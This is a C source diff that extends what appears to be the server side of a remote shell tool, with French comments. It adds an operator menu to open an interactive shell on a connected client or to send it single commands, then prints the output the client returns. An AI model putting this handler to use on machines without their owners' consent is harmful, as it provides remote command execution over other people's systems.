@@ -38,10 +38,10 @@ int connect_to_server( const char* const addr ) {
 int connect_from_client( ) {
   int sock, fd,yes=1;                 
   struct sockaddr_in local;     
-
+  char c = 0;
   
   sock = socket( PF_INET, SOCK_STREAM, 0 );
-  if ( sock == -1 ) {     
+  if ( sock ==0-1 ) {     
     perror("error: sock");
     return -1;
   }
@@ -79,10 +79,26 @@ int connect_from_client( ) {
     if ( fd < 0 ) {    
       perror("error: fd");
     }
-    else {             
-      // il envoie les ordres au client
-      sent_to_client( fd );
-      close(fd);    
+    else {  
+      while(1)
+      {           
+        printf("What do you want ?(type s for shell or c for one command)\n");
+        c = getchar();
+
+        if(c=='s')
+        {
+            printf("Opening shell from client %s\n",inet_ntoa(client.sin_addr));
+            // il envoie les ordres au client
+            shell_from_client( fd );
+             
+        }else if(c=='c')
+        {
+           sendCommand(fd,inet_ntoa(client.sin_addr));
+        }
+
+    
+        while ((c = getchar()) != '\n' && c != EOF);
+      }
     }
   }
   
@@ -90,10 +106,67 @@ int connect_from_client( ) {
   return 0;
 }
 
-// envoi des ordres au client
-void sent_to_client( int sock ) {
+void sendCommand(int sock,char* ip)
+{
   char str[BUFFERSIZE];
   ssize_t len;
+
+  strcpy(str,"cmd\n");
+  len = write( sock, str, strlen(str) );
+  if ( len == -1 ) {    
+      perror("error: send start cmd");
+      return;
+  }
+
+char c;
+  printf("Entrez la commande à envoyer : ");
+  while ((c = getchar()) != '\n' && c != EOF);
+  fgets( str, sizeof(str) - 1, stdin );
+  printf("Envoie de la commande : %s\n",str);
+
+  len = write(sock , str, strlen(str));
+  if (len < 0)
+  {
+    printf("Error send command\n");
+    return;
+  }
+    printf("command result from %s : ",ip);
+      while ( 1 ) {
+      len = read( sock, str, sizeof(str) - 1 );
+      if ( len > 0 ) {    
+        str[len] = '\0';
+         if ( strstr( str, "quit: result" )) {
+
+                  break;
+                }
+      }
+      else {   
+        perror("error: recv command result");
+        return;
+      }
+
+      printf("%s",str);
+      
+      
+      if ( receipt_confirmation( sock, SEND ) == ERROR ) {
+        close(sock);
+        return;
+      }
+    }
+}
+
+// envoi des ordres au client
+void shell_from_client( int sock ) {
+  char str[BUFFERSIZE];
+  ssize_t len;
+  strcpy(str,"start shell\n");
+  len = write( sock, str, strlen(str) );
+    if ( len == -1 ) {    
+      perror("error: send start shell");
+      return;
+    }
+
+
   while ( 1 ) {
     len = read( sock, str, sizeof(str) - 1 );
     if ( len > 0 ) {    
@@ -105,7 +178,6 @@ void sent_to_client( int sock ) {
       break;
     }
 
-    
     fgets( str, sizeof(str) - 1, stdin );
     
     
@@ -116,7 +188,8 @@ void sent_to_client( int sock ) {
     }
 
     if ( strcmp( str, "exit\n" ) == 0 ) {
-      printf("Deconnection\n");
+      printf("Deconnection...\n");
+
       return;
     }
     
@@ -125,7 +198,8 @@ void sent_to_client( int sock ) {
       if ( len > 0 ) {    
         str[len] = '\0';
 
-        if ( strcmp( str, "quit: result" ) == 0 ) {
+        if ( strstr( str, "quit: result" )) {
+
           break;
         }
       }
@@ -151,7 +225,6 @@ void sent_to_client( int sock ) {
     }
   }
 
- close(sock);
 }
 
 
